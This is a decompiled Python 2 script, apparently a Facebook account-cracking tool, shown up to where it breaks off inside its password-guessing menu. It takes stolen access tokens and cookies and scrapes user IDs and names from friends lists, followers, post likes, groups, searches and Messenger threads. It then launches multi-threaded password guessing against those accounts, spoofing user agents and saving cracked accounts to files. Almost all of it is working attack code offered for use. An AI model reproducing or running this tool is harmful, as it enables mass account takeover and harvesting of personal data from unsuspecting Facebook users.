# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: romi
Hj = '\x1b[1;92m'
Mt = '\x1b[0m'
ingfo = '%s\n \xe2\x80\xa2 Info script :\n \t\n - author      : Mr Ihsan\n - facebook    : facebook.com/unkonwX071\n - Whatsaap    +994401850814: \n - Adrees:       F:R Peshawar\n - github      : github.com/Hax00r-xsan\n - script name : META\n - version     : 1.1\n \n%s' % (Hj, Mt)
import os
try:
    import lolcat
except ImportError:
    os.system('pip2 install lolcat')

try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
waktu = '%s-%s-%s' % (hari, bulan, tahun)
bulan12 = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
reload(sys)
sys.setdefaultencoding('utf-8')
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
P = '\x1b[1;97m'
N = '\x1b[0m'
acak = [M, H, K, B, U, O, P]
warna = random.choice(acak)
til = '\xe2\x80\xa2'
ok, cp, id, user, loop = ([], [], [], [], 0)

def konfir():
    try:
        lis = open('data/lisense.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '%s\xe2\x80\xa2 Expired license' % M
        jeda(2)
        os.system('rm -rf data/lisense.txt')
        konfirmasi()

    if os.path.exists('data/lisense.txt'):
        konfirmasi1()
    else:
        konfirmasi()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        jeda(0.03)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r%s%s Delete TOKEN %s' % (M, til, o),
        sys.stdout.flush()
        jeda(1)


def folder():
    try:
        os.mkdir('OK')
    except:
        pass

    try:
        os.mkdir('CP')
    except:
        pass

    try:
        os.mkdir('data')
    except:
        pass

    try:
        ua_ = open('data/ua.txt', 'r').read()
    except KeyError as IOError:
        ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('data/ua.txt', 'w').write(ua_)
    except:
        pass


IP = requests.get('https://api.ipify.org/').text
author ="MR IHSAN"
fb_me ="FACEBOOK IHSANULLAH"
github ="Whatsapp +994401850814"

def banner():
    print ' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n     %s    %s %sEditor- %s: %s%s %s%s   \n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sWT%s  : %s%s \n %s# %s---------------------------------------- %s#  ' % (
     M, til, K, til, H, til, M, til, K, til, H, til, M, P, U, til, K, M, K, author, U, til, M, til, K, til, H, til, M, til, K, til, H, til, U, O, M, O, fb_me, U, O, M, O, github, P, M, P)
    print ' %s#%s IP   %s:%s %s%s ' % (U, O, M, O, IP, M)


header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

def masuk():
    os.system('clear')
    banner()
    print '\n%s%s%s 01 %sLogin With token \n%s%s%s 02%s HOW TO GET TOKEN \n%s%s%s 00 %sEXIT' % (U, til, K, O, U, til, K, O, U, til, M, O)
    rom = raw_input('\n%s# %sChouse %s> %s' % (P, O, M, K))
    if rom in '':
        print '%s%s wrong input ' % (M, til)
        exit()
    elif rom in ('1', '01'):
        jalan('\n%s!%s PLEASE DO NOT LOGIN YOUR PERSONAL ACCOUNT' % (M, O))
        romz = raw_input('%s# %sPast-Token %s> %s' % (P, O, M, K))
        if romz in '':
            print '%s%s Wrong TOKEN Bro ' % (M, til)
        try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s' % romz).json()['name']
            print '\n%s%s Login success, please wait ' % (H, til)
            jeda(2)
            open('data/token.txt', 'w').write(romz)
            menu()
        except (KeyError, IOError):
            print '%s%s Token Expire ' % (M, til)
            jeda(2)
            masuk()

    elif rom in ('2', '02'):
        print '\n%s%s Helo :' % (H, til)
        jeda(2)
        print ' - prepare a facebook account (required sacrificial account)'
        jeda(2)
        print ' - loginkan akun facebook (tumbal) di browser %sChrome %s' % (O, H)
        jeda(2)
        print ' - url alamat wajib %shttps://m.facebook.com %s(mode data)' % (O, H)
        jeda(2)
        print ' - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_' % O
        jeda(2)
        print '%s - taruh link tersebut di url alamat facebook lalu klik cari ' % H
        jeda(2)
        print ' - jika sudah, klik %stitik tiga %spojok kanan atas ' % (O, H)
        jeda(2)
        print ' - kemudian klik %sCari di Halaman %s' % (O, H)
        jeda(2)
        print ' - ketik %sEAAAA %sakan muncul acces token.' % (O, H)
        jeda(2)
        print ' - if you have dont forget to copy \n'
        jeda(2)
        nanya = raw_input('%s%s%s you understand? %sy%s/%sn :%s ' % (U, til, O, H, O, M, K))
        if nanya in '':
            print '%s%s I asked a question must be answered ' % (M, til)
            jeda(2)
            masuk()
        elif nanya in ('y', 'Y'):
            print '\n%s%s congrats you are smart :* ' % (H, til)
            jeda(2)
            masuk()
        elif nanya in ('n', 'N'):
            print '\n%s%s you are really stupid ' % (M, til)
            jeda(2)
            os.system('xdg-open https://youtu.be/IG5QfdxRkeY')
            masuk()
    elif rom in ('0', '00'):
        exit('\n')
    else:
        print '%s%s wrong input ' % (M, til)
        exit()


host = 'https://mbasic.facebook.com'
ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def __romz__():
    if os.path.exists('data/cookies'):
        if os.path.getsize('data/cookies') != 0:
            return cvd(open('data/cookies').read().strip())
        _romiXD_()
    else:
        _romiXD_()


def _romiXD_(show=True):
    if show == True:
        print '\n%s%s%s FAST LOGIN Cookies, enter your Facebook cookie' % (U, til, O)
    ck = raw_input('%s# %sPAST-Cookie %s> %s' % (P, O, M, K))
    if ck == '':
        _romiXD_(show=False)
    try:
        cks = cvd(ck)
        if kueh(cks) == True:
            open('data/cookies', 'w').write(ck)
            exit('%s%s login success, type: python2 META.py ' % (H, til))
        else:
            print '%s%s login failed.' % (M, til)
            _romiXD_(show=True)
    except Exception as e:
        print '%s%s error : %s\n' % (M, til, e)
        _romiXD_(show=False)


def kueh(cookies):
    f = False
    b = requests.get('https://mbasic.facebook.com/profile.php', headers={'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')), 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}, cookies=cookies).text
    if 'mbasic_logout_button' in b.lower():
        f = True
        if f == True:
            return True
        exit('%s%s login filled. ' % (M, til))


def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def cvs(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def publik(romz, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print "\n%s%s %s TYPE '%s/me\%s' DUMP YOUR LOGIN ID " % (U, til, O, H, O)
        idt = raw_input('%s%s %sTarget id%s > %s' % (U, til, O, M, K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, romz))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s' % (idt, romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s collect id%s >%s %s ' % (U, til, O, M, H, str(len(id))),
            sys.stdout.flush()
            jeda(0.005)

        bff.close()
        print '\n\n%s%s Success dump id from %s' % (H, til, nm['name'])
        print '%s%s%s Please Copy Red Color File %s>%s %s ' % (U, til, O, M, H, file)
        raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
        menu()
    except Exception as e:
        exit('\n%s%s failed dump id' % (M, til))


def followers(romz, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print "\n%s%s %sTYPE '%/sme\%s' DUMP YOUR LOGIN FOLLOWRS " % (U, til, O, H, O)
        idt = raw_input('%s%s %sTarget id%s  > %s' % (U, til, O, M, K))
        batas = raw_input('%s%s %s Limit Followrs IDs%s > %s' % (U, til, O, M, K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, romz))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (idt, batas, romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s collect id%s >%s %s ' % (U, til, O, M, H, str(len(id))),
            sys.stdout.flush()
            jeda(0.005)

        bff.close()
        print '\n\n%s%s Succes dump followers of %s ' % (H, til, nm['name'])
        print '%s%s%s Please Copy Red Color FILe %s>%s %s ' % (U, til, O, M, H, file)
        raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
        menu()
    except Exception as e:
        exit('\n%s%s Not public dumb id' % (M, til))


def postingan(romz, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print '\n%s%s %sKeep in mind that posts must be public ' % (U, til, O)
        idt = raw_input('%s%s %sId post%s   > %s' % (U, til, O, M, K))
        simpan = raw_input('%s%s%s Name file%s > %s' % (U, til, O, M, K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s' % (idt, romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s collect id%s >%s %s ' % (U, til, O, M, H, str(len(id))),
            sys.stdout.flush()
            jeda(0.005)

        bff.close()
        print '\n\n%s%s Succes dump id posting ' % (H, til)
        print '%s%s%s Saved dump files %s>%s %s ' % (U, til, O, M, H, file)
        raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
        menu()
    except Exception as e:
        exit('\n%s%s filed dump Post' % (M, til))


class group():

    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.manual()
        exit()

    def manual(self):
        print '\n%s%s%s Keep in mind the group must be public or must join the group' % (U, til, O)
        id = raw_input('%s%s%s Id groups%s > %s' % (U, til, O, M, K))
        if id in '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'no content' in r.find('title').text.lower():
                exit('%s%s input a valid group id, stupid, error id, or you havent joined the group yet' % (M, til))
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print '%s%s%s Name Group%s > %s%s..' % (U, til, O, M, H, self.listed.get('name')[0:20])
                self.dumps('https://mbasic.facebook.com/groups/' + id)

    def f(self):
        self.fl = raw_input('%s%s%s Name File %s> %s' % (U, til, O, M, K)).replace(' ', '_')
        if self.fl == '':
            self.f()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print '\r%s%s%s collect id %s> %s%s \x1b[1;97m- please wait\r' % (U, til, O, M, H, str(len(open(self.fl).read().splitlines())))
        sys.stdout.flush()
        jeda(0.005)
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'See More Posts' in i.text:
                while True:
                    try:
                        self.dumps('https://mbasic.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print '\r\x1b[1;91m\xe2\x80\xa2%s, retrying...' % e
                        continue

        print '\n\n%s%s Succes dump id member group ' % (H, til)
        print '%s%s%s Saved dump files %s>%s %s ' % (U, til, O, M, H, self.fl)
        raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
        menu()


def cek(arg):
    if os.path.exists('data/cookies'):
        if os.path.getsize('data/cookies') != 0:
            return True
        else:
            return False

    else:
        return False


def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            cookie = raw_input('\n%s%s%s Fast Login Cookie, enter your Facebook cookie\n%s# %sCookie%s > %s' % (U, til, O, P, O, M, K))
            cvds = cvd(cookie)
            new = True
        except:
            print '\x1b[1;91m\xe2\x80\xa2 invalid cookie'
            dumpfl()

    else:
        cvds = cvd(open('data/cookies').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        if lang(cvds) != True:
            exit('%s%s failed to detect language.' % (M, til))
        if new == True:
            open('data/cookies', 'w').write(cookie)
        sim = raw_input('\n%s%s%s Name file %s>%s ' % (U, til, O, M, K)).replace(' ', '_')
        print '%s%s%s Example Name of the person %s[ %s Handsome IHSAN %s]' % (U, til, O, P, H, P)
        s = raw_input('%s%s%s Set name %s> %s' % (U, til, O, M, K))
        if s in ('romi', 'Romi', 'ROMI', 'Romi Afrizal', 'Romi afrizal', 'ROMI AFRIZAL',
                 'romi afrizal'):
            print '\n%s%s the puppy wants to crack with my name ' % (M, til)
            exit()
        elif s in ('Romi Ganteng', 'Romi ganteng', 'ROMI GANTENG', 'romi ganteng'):
            print '\n%s%s IHSAN is really handsome bro' % (H, til)
            exit()
        namah(sim, cvds, 'https://mbasic.facebook.com/search/people/?q=' + s)
    else:
        try:
            os.remove('data/cookies')
        except:
            pass

        print '\x1b[1;91m\xe2\x80\xa2 login fail!'
        dumpfl()
    return


def namah(sim, r, b):
    open(sim, 'a+')
    b = bs4.BeautifulSoup(requests.get(b, cookies=r, headers=hdcok()).text, 'html.parser')
    for i in b.find_all('a', href=True):
        print '\r%s%s%s collect id %s> %s%s \x1b[1;97m- Please wait' % (U, til, O, M, H, str(len(open(sim).read().splitlines()))),
        sys.stdout.flush()
        if '<img alt=' in str(i):
            if 'home.php' in str(i['href']):
                continue
            else:
                g = str(i['href'])
                if 'profile.php' in g:
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    d = bs4.re.findall('/profile\\.php\\?id=(.*?)&', g)
                    if len(d) != 0:
                        pk = ('').join(d)
                        if pk in open(sim).read():
                            pass
                        else:
                            open(sim, 'a+').write('%s<=>%s\n' % (pk, name))
                else:
                    d = bs4.re.findall('/(.*?)\\?', g)
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    if len(d) != 0:
                        pk = ('').join(d)
                        if pk in open(sim).read():
                            pass
                        else:
                            open(sim, 'a+').write('%s<=>%s\n' % (pk, name))
        if 'See Next Results' in i.text:
            namah(sim, r, i['href'])

    print '\n\n%s%s Success dump id name search ' % (H, til)
    print '%s%s%s Saved dump files %s>%s %s ' % (U, til, O, M, H, sim)
    raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
    menu()


class pesan():

    def __init__(self, cookies):
        self.cookies = cookies
        self.f = raw_input('\n%s%s%s Name file%s >%s ' % (U, til, O, M, K)).replace(' ', '_')
        if self.f == '':
            pesan(cookies)
        open(self.f, 'w').close()
        self.dump('https://mbasic.facebook.com/messages')

    def dump(self, url):
        open(self.f, 'a+')
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        print '\r%s%s%s gather id %s> %s%s \x1b[1;97m- Please wait\r' % (U, til, O, M, H, str(len(open(self.f).read().splitlines())))
        sys.stdout.flush()
        jeda(0.005)
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))

                except Exception as e:
                    continue

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://mbasic.facebook.com/' + i.get('href'))

        print '\n%s%s Succes dump id pesan mesengger ' % (H, til)
        print '%s%s%s File dump tersimpan %s>%s %s ' % (U, til, O, M, H, self.f)
        raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
        menu()


ugent = random.choice([
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)',
 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36',
 'Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
 'Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]',
 'Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]',
 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
 'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
 '[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]'])

def useragent():
    print '\n%s%s%s 01 %sChange user agent ' % (U, til, P, O)
    print '%s%s%s 02 %sCheek user agent ' % (U, til, P, O)
    print '%s%s%s 00 %sRetrun ' % (U, til, M, O)
    uas()


def uas():
    u = raw_input('\n%s#%s Choose%s >%s ' % (P, O, M, K))
    if u == '':
        print '%s%s Wrong Input' % (M, til)
        jeda(2)
        uas()
    elif u in ('1', '01'):
        print '%s%s%s Type %s /ME/%s in google chrome browser\n%s%s%s to use your own user agent' % (U, til, O, H, O, U, til, O)
        print '%s%s%s Type %s/NO/%s to use the tool built in user agent' % (U, til, O, H, O)
        try:
            ua = raw_input('%s%s%s Enter user agent %s: %s' % (U, til, O, M, K))
            if ua in '':
                print '%s%s Wrong Input ' % (M, til)
                jeda(2)
                menu()
            elif ua in ('ME', 'me', 'Me', 'mE'):
                jalan('%s%s%s You will be redirected to a browser ' % (U, til, O))
                jeda(2)
                os.system('am start https://www.google.com/search?q=My+user+agent>/dev/null')
                jeda(2)
                useragent()
            elif ua in ('NO', 'No', 'no'):
                ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open('data/ua.txt', 'w').write(ua_)
                jeda(2)
                print '\n%s%s using the default user agent ' % (H, til)
                jeda(2)
                menu()
            open('data/ua.txt', 'w').write(ua)
            jeda(2)
            print '\n%s%s successfully changed user agent' % (H, til)
            jeda(2)
            menu()
        except KeyboardInterrupt:
            exit('\x1b[1;91m\xe2\x80\xa2 Error ')

    elif u in ('2', '02'):
        try:
            ua_ = open('data/ua.txt', 'r').read()
            jeda(2)
            print '%s%s%s user agent anda : %s%s' % (U, til, O, H, ua_)
            jeda(2)
            raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
            menu()
        except IOError:
            ua_ = '%s-' % M

    elif u in ('0', '00'):
        menu()
    else:
        print '%s%s Wrong Input' % (M, til)
        jeda(2)
        uas()


class ngentod():

    def __init__(self):
        self.id = []

    def romiy(self):
        try:
            self.apk = raw_input('\n%s\xe2\x80\xa2%s file dump %s> %s' % (U, O, M, K))
            self.id = open(self.apk).read().splitlines()
            print '%s\xe2\x80\xa2%s number of ID%s > %s%s' % (U, O, M, H, len(self.id))
        except:
            print '\n%s\xe2\x80\xa2 The dump Not Found please Try Again' % M
            raw_input('\n%s\xe2\x80\xa2 %s[ %sEnter %s] ' % (U, O, U, O))
            menu()

        unikers = raw_input('%s\xe2\x80\xa2%s use manual password? y/t%s > %s' % (U, O, M, K))
        if unikers in ('Y', 'y'):
            print '\n%s\xe2\x80\xa2%s Example%s >%s Pakistan%s,%786786%s,%123456' % (U, O, M, O, M, O, M, O)
            while True:
                pwx = raw_input('%s\xe2\x80\xa2%s password %s> %s' % (U, O, M, K))
                if pwx == '':
                    print '\n%s\xe2\x80\xa2 dont be empty ' % M
                elif len(pwx) <= 5:
                    print '\n%s\xe2\x80\xa2 Password minimum 6 characters' % M
                else:

                    def manual(brute=None):
                        ind = raw_input('\n%s#%s Chooses %s> %s ' % (P, O, M, K))
                        if ind == '':
                            print '%s\xe2\x80\xa2 Wrong input ' % M
                            manual()
                        elif ind in ('1', '01'):
                            print '\n%s%s%s Account %s[OK] %s saved to file %s> %sOK/%s.txt' % (U, til, O, H, O, M, H, waktu)
                            jeda(0.2)
                            print '%s%s%s Account %s[%sCP%s]%s saved to file %s> %sCP/%s.txt' % (U, til, O, M, K, M, O, M, K, waktu)
                            jeda(0.2)
                            print '%s!%s the crack is running, press CTRL+Z to stop\n' % (U, O)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, brute)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit('%s\xe2\x80\xa2 finished' % H)
                        elif ind in ('2', '02'):
                            print '\n%s%s%s Account %s[OK] %s Saved to File %s> %sOK/%s.txt' % (U, til, O, H, O, M, H, waktu)
                            jeda(0.2)
                            print '%s%s%s Account %s[%sCP%s]%s Saved to File %s> %sCP/%s.txt' % (U, til, O, M, K, M, O, M, K, waktu)
                            jeda(0.2)
                            print '%s!%s the crack is running, press CTRL+Z to stop\n' % (U, O)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, brute)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit('%s\xe2\x80\xa2 finished' % H)
                        elif ind in ('3', '03'):
                            print '\n%s%s%s Account %s[OK] %sSaved to FILe %s> %sOK/%s.txt' % (U, til, O, H, O, M, H, waktu)
                            jeda(0.2)
                            print '%s%s%s Account %s[%sCP%s]%s Saved To FILe %s> %sCP/%s.txt' % (U, til, O, M, K, M, O, M, K, waktu)
                            jeda(0.2)
                            print '%s!%s the crack is running, press CTRL+Z to stop\n' % (U, O)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, brute)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit('%s\xe2\x80\xa2 finished' % H)
                        else:
                            print '\n%s\xe2\x80\xa2 Wrong input' % M
                            manual()

